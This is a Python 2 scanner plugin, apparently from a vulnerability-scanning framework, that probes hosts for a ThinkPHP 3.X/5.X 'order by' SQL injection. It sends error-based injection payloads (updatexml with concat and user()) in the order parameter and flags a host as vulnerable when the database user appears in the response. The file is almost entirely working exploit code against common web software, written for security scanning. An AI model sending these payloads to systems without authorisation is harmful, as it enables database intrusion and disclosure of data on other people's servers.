# coding=utf-8
import socket
import time
import urllib2

def get_plugin_info():
    plugin_info = {
        "name": "ThinkPHP 3.X/5.X order by注入漏洞",
        "info": "攻击者可利用key构造SQL语句进行注入",
        "level": "高危",
        "type": "SQL注入",
        "author": "muYoz@bg",
        "url": "https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w",
        "keyword": "tag:php",
        "source": 1
    }
    return plugin_info


def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        flag = "GET /?order[updatexml(1,concat(0x3a,user()),1)]=1 HTTP/1.1"
        s.send(flag)
        time.sleep(1)
        data = s.recv(1024)
        s.close()
        if 'GET' in data:
            url = 'http://' + ip + ":" + str(port) + '/?order[updatexml(1,concat(0x3a,user()),1)]=1'
            request = urllib2.Request(url)
            res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
            if 'root' in res_html:
                return u"ThinkPHP 3.X order by注入漏洞"


    except Exception, e:
        pass

    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        flag = "GET /index?order[id`|updatexml(1,concat(0x3a,user()),1)%23]=1 HTTP/1.1"
        s.send(flag)
        time.sleep(1)
        data = s.recv(1024)
        s.close()
        if 'GET' in data:
            url = 'http://' + ip + ":" + str(port) + '/index?order[id`|updatexml(1,concat(0x3a,user()),1)%23]=1'
            request = urllib2.Request(url)
            res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
            if 'root' in res_html:
                return u"ThinkPHP 5.X order by注入漏洞"
    except Exception, e:
        pass
